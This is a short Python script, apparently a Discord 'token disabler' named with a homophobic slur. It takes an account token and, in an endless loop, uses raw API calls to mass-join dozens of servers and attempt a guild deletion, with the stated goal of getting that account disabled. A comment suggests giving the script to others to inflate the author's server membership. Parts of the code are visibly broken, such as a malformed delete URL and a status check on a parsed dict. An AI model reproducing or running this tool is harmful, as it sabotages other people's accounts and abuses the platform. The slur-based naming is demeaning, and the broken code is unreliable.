import os

os.system("pip install requests")
os.system("pip install time")

import requests
import json
import sys
import time

token = input("Token: ")

print("Starting el gay disabler...")
# kinda pasted but all code looks the same so dont blame me
while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw") # u can change the server to ur server and give it to other ppl so u get more inactive members
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/codm", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/anime", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/growtopia", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/incognito", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/aliucord", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/5toubun", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/tonikawa", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/dragonmaid", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/disney", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/powerkuyofficial", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/horimiya", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/3amoor", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/nhentai", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/chill", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/warrior", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/warzone", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/mortal", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/slash", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/fortnite", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/glowy", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/normal", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/inviter", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/dangerous", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/asus", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/toxic", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/cool", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/vibe", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/music", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/bear", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/chat", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/samsung", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/codez", headers={"Authorization": token})
    requests.post("https://discordapp.com/api/v6/invite/spacex", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff.status_code == 0:
        print("De token has been de disabled :)")
        break
